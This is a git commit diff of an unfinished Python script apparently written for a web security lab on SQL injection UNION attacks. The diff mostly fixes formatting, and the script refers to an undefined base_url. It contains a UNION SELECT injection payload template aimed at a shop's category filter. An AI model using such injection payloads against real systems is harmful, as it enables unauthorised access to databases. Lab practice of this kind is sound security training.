079e7aacaee93630a815c4c1e6c7bd1a6bd888a6
madi <madimirzakup@gmail.com>
2025-01-12 02:51:16 +0500

    #

--- Server Side Topics/SQLi/SQL injection UNION attack, determining the number of columns returned by the query/payload.py
+++ Server Side Topics/SQLi/SQL injection UNION attack, determining the number of columns returned by the query/payload.py
@@ -6,22 +6,24 @@ import urllib3
 import requests
 
 import utils
-from shop import Shop#
+from shop import Shop
 
 log = logging.getLogger(__name__)
 logging.basicConfig(
     stream=sys.stdout,
     level=logging.INFO,
     format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
-    style="{"
+    style="{", 
     datefmt="%H:%M:%S",
 )
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def main(args):
     shop = Shop()
     filter_path = "filter?category=' UNION SELECT {nulls}-- "
     requests.get(base_url)
+
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
